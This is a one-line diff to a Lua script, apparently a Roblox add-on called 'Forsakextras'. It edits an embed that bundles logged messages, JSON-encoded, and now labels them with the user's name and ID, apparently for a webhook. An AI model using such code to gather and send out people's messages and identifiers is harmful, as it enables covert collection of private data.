@@ -214,7 +214,7 @@ local function ForsakextrasLoad()
 							embeds = {
 								{
 									author = {name = "Messages Logged!"},
-									title = tostring(#messages).." Messages Found!",
+									title = tostring(#messages).." messages from "..Username.."'s ("..UserId..") session",
 									description = http:JSONEncode(messages),
 									timestamp = getRealTime(tick()),
 									color = 2053964, -- Keep it as a number, not string
